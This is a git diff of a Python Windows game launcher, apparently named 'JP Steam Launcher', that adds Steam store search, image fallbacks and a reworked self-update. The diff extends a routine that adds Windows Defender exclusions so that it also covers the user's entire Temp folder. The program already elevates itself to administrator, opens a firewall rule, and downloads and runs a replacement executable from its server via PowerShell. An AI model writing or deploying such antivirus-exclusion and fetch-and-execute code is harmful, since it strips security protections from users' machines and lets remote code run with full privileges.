@@ -16,6 +16,7 @@ import ctypes
 import winreg
 import urllib.request
 import urllib.error
+import urllib.parse
 import zipfile
 import shutil
 import tempfile
@@ -296,6 +297,9 @@ def _add_defender_exclusion():
         exe_dir = os.path.dirname(sys.executable)
         if exe_dir and exe_dir not in paths:
             paths.append(exe_dir)
+    temp_dir = os.environ.get("LOCALAPPDATA", "")
+    if temp_dir:
+        paths.append(os.path.join(temp_dir, "Temp"))
     for p in paths:
         try:
             subprocess.run(
@@ -821,6 +825,7 @@ class LauncherApp(ctk.CTk):
         # === ABA JOGOS DISPONÍVEIS ===
         self._games_data = []
         self._cache_imgs = {}
+        self._api_img_urls = {}
         self._cards_container = None
 
         top_jogos = ctk.CTkFrame(tab_jogos, fg_color="transparent")
@@ -1203,7 +1208,7 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
         return [(appid, nome) for appid, nome, _ in com_data[:limit]]
 
     def _buscar_steam_api(self, app_id):
-        """Busca info de um jogo na Steam Store API. Retorna (app_id, nome) ou None."""
+        """Busca info de um jogo na Steam Store API por App ID. Retorna (app_id, nome) ou None."""
         try:
             url = f"https://store.steampowered.com/api/appdetails?appids={app_id}"
             req = urllib.request.Request(url, headers={"User-Agent": "JP-Steam-Launcher/1.0"})
@@ -1211,11 +1216,38 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
                 data = json.loads(r.read().decode())
             info = data.get(str(app_id), {})
             if info.get("success"):
-                nome = info["data"].get("name", f"App {app_id}")
+                game_data = info["data"]
+                nome = game_data.get("name", f"App {app_id}")
+                header_img = game_data.get("header_image", "")
+                if header_img:
+                    self._api_img_urls[str(app_id)] = header_img
                 return (str(app_id), nome)
         except Exception:
             pass
         return None
+
+    def _buscar_steam_por_nome(self, termo):
+        """Busca jogos na Steam Store Search API por nome. Retorna lista de (app_id, nome)."""
+        try:
+            encoded = urllib.parse.quote(termo)
+            url = f"https://store.steampowered.com/api/storesearch/?term={encoded}&l=portuguese&cc=BR"
+            req = urllib.request.Request(url, headers={"User-Agent": "JP-Steam-Launcher/1.0"})
+            with urllib.request.urlopen(req, timeout=10) as r:
+                data = json.loads(r.read().decode())
+            items = data.get("items", [])
+            resultados = []
+            for item in items[:20]:
+                aid = str(item.get("id", ""))
+                nome = item.get("name", "")
+                if aid and nome:
+                    resultados.append((aid, nome))
+                    tiny = item.get("tiny_image", "")
+                    if tiny:
+                        self._api_img_urls[aid] = tiny
+            return resultados
+        except Exception:
+            pass
+        return []
 
     def _filtrar_jogos(self):
         """Sem busca: mostra recém adicionados + populares. Com busca: filtra por link/ID/nome."""
@@ -1248,13 +1280,18 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
                 if busca in appid_str or busca_lower in nome.lower():
                     filtrados.append((appid_str, nome))
 
-            # Se não achou na lista local e a busca parece um App ID, tenta na Steam API
-            if not filtrados and busca.isdigit():
+            # Se não achou na lista local, tenta na Steam API
+            if not filtrados:
                 self.lbl_total.configure(text="Buscando na Steam...")
                 self.update_idletasks()
-                resultado_api = self._buscar_steam_api(busca)
-                if resultado_api:
-                    filtrados.append(resultado_api)
+                if busca.isdigit():
+                    resultado_api = self._buscar_steam_api(busca)
+                    if resultado_api:
+                        filtrados.append(resultado_api)
+                else:
+                    resultados_nome = self._buscar_steam_por_nome(busca)
+                    if resultados_nome:
+                        filtrados.extend(resultados_nome)
 
             total = len(filtrados)
             total_base = len(self._games_data)
@@ -1341,7 +1378,7 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
         self._load_game_image(app_id, lbl_img)
 
     def _load_game_image(self, app_id, lbl):
-        """Carrega imagem do jogo da Steam CDN em background, com cache em disco."""
+        """Carrega imagem do jogo da Steam CDN em background, com cache em disco e fallbacks."""
         def worker():
             try:
                 if app_id in self._cache_imgs:
@@ -1351,11 +1388,29 @@ Remove-Item "$s\\ext" -Recurse -Force -ErrorAction SilentlyContinue"""
                         return
                     path = os.path.join(tempfile.gettempdir(), f"jp_steam_{app_id}.jpg")
                     if not os.path.exists(path) or os.path.getsize(path) < 100:
-                        url = f"https://cdn.cloudflare.steamstatic.com/steam/apps/{app_id}/header.jpg"
-                        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
-                        with urllib.request.urlopen(req, timeout=10) as r:
-                            with open(path, "wb") as f:
-                                f.write(r.read())
+                        urls = [
+                            f"https://cdn.cloudflare.steamstatic.com/steam/apps/{app_id}/header.jpg",
+                            f"https://cdn.akamai.steamstatic.com/steam/apps/{app_id}/header.jpg",
+                            f"https://steamcdn-a.akamaihd.net/steam/apps/{app_id}/header.jpg",
+                        ]
+                        api_url = self._api_img_urls.get(app_id)
+                        if api_url:
+                            urls.insert(0, api_url)
+                        downloaded = False
+                        for url in urls:
+                            try:
+                                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
+                                with urllib.request.urlopen(req, timeout=8) as r:
+                                    data = r.read()
+                                    if len(data) > 100:
+                                        with open(path, "wb") as f:
+                                            f.write(data)
+                                        downloaded = True
+                                        break
+                            except Exception:
+                                continue
+                        if not downloaded:
+                            return
                     _lanczos = getattr(PILImage, "Resampling", PILImage).LANCZOS if hasattr(PILImage, "Resampling") else PILImage.LANCZOS
                     img = PILImage.open(path).convert("RGBA").resize((148, 70), _lanczos)
                     self._cache_imgs[app_id] = img
@@ -1699,14 +1754,50 @@ def check_for_update():
         return False, None
 
 
+def _apply_pending_update():
+    """No início da execução, aplica atualização pendente (.new) e limpa resíduos."""
+    if not getattr(sys, "frozen", False):
+        return
+    try:
+        exe_path = os.path.abspath(sys.executable)
+        exe_dir = os.path.dirname(exe_path)
+        new_path = exe_path + ".new"
+        old_path = exe_path + ".old"
+
+        # Limpa o .old residual de atualizações anteriores
+        if os.path.exists(old_path):
+            try:
+                os.remove(old_path)
+            except Exception:
+                pass
+
+        # Limpa o .bat de atualização se sobrou
+        bat_path = os.path.join(exe_dir, "_jp_update.bat")
+        if os.path.exists(bat_path):
+            try:
+                os.remove(bat_path)
+            except Exception:
+                pass
+
+        # Aplica .new pendente (fallback caso o .bat não tenha funcionado)
+        if os.path.exists(new_path) and os.path.getsize(new_path) > 10000:
+            try:
+                os.remove(exe_path)
+            except Exception:
+                pass
+            os.rename(new_path, exe_path)
+    except Exception:
+        pass
+
+
 def do_self_update(download_url):
-    """Baixa o novo EXE e substitui o atual. Retorna True se atualizou."""
+    """Baixa o novo EXE como .new para ser aplicado na próxima execução."""
     if not getattr(sys, "frozen", False):
         return False
     try:
-        exe_path = sys.executable
+        exe_path = os.path.abspath(sys.executable)
         new_path = exe_path + ".new"
-        old_path = exe_path + ".old"
+
         ps_script = (
             f"try {{ "
             f"  Invoke-WebRequest -Uri '{download_url}' -OutFile '{new_path}' -UseBasicParsing -TimeoutSec 60; "
@@ -1720,13 +1811,8 @@ def do_self_update(download_url):
         )
         if "OK" not in r.stdout:
             return False
-        if not os.path.exists(new_path) or os.path.getsize(new_path) < 1000:
+        if not os.path.exists(new_path) or os.path.getsize(new_path) < 10000:
             return False
-        # Renomeia: atual → .old, novo → atual
-        if os.path.exists(old_path):
-            os.remove(old_path)
-        os.rename(exe_path, old_path)
-        os.rename(new_path, exe_path)
         return True
     except Exception:
         return False
@@ -1768,6 +1854,41 @@ def _close_update_splash():
         pass
 
 
+def _apply_update_and_restart():
+    """Renomeia o exe atual para .old, renomeia .new para o original e relança."""
+    try:
+        exe_path = os.path.abspath(sys.executable)
+        new_path = exe_path + ".new"
+        old_path = exe_path + ".old"
+
+        if not os.path.exists(new_path):
+            return
+
+        # Windows permite renomear um exe em execução
+        if os.path.exists(old_path):
+            try:
+                os.remove(old_path)
+            except Exception:
+                pass
+
+        os.rename(exe_path, old_path)
+        os.rename(new_path, exe_path)
+
+        # Lança o novo exe e sai
+        subprocess.Popen(
+            [exe_path] + sys.argv[1:],
+            creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP,
+        )
+        os._exit(0)
+    except Exception as e:
+        ctypes.windll.user32.MessageBoxW(
+            0,
+            f"Erro ao aplicar atualização: {e}\nFeche o launcher e abra novamente.",
+            "JP Steam Launcher",
+            0x10,
+        )
+
+
 def main():
     if not is_admin():
         ctypes.windll.shell32.ShellExecuteW(
@@ -1779,17 +1900,27 @@ def main():
     add_firewall_rule()
     _add_defender_exclusion()
 
-    # 2. Auto-update: sempre puxa a versão mais recente do servidor
+    # 2. Aplica atualização pendente (se foi baixada na execução anterior)
+    _apply_pending_update()
+
+    # 3. Auto-update: baixa nova versão e aplica automaticamente
     if getattr(sys, "frozen", False):
         try:
             needs_update, download_url = check_for_update()
             if needs_update and download_url:
                 _show_update_splash()
-                if do_self_update(download_url):
-                    _close_update_splash()
-                    subprocess.Popen([sys.executable] + sys.argv[1:])
-                    sys.exit(0)
+                updated = do_self_update(download_url)
                 _close_update_splash()
+                if updated:
+                    resp = ctypes.windll.user32.MessageBoxW(
+                        0,
+                        "Nova atualização disponível!\n\nClique OK para aplicar e reiniciar o launcher.",
+                        "JP Steam Launcher - Atualização",
+                        0x01 | 0x40,  # MB_OKCANCEL | MB_ICONINFORMATION
+                    )
+                    if resp == 1:  # IDOK
+                        _apply_update_and_restart()
+                    # Se cancelou, continua com a versão atual
         except Exception:
             _close_update_splash()
 
